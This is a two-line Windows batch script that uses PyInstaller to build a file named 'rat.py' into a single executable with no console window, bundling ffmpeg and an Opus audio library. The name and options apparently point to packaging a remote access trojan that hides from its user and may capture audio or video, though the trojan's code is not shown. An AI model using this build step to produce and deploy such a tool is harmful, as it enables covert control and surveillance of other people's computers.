cd /d "%~dp0"
pyinstaller --additional-hooks-dir . --noconsole --onefile --add-binary "ffmpeg.exe;." --add-binary "libopus-0.dll;." rat.py
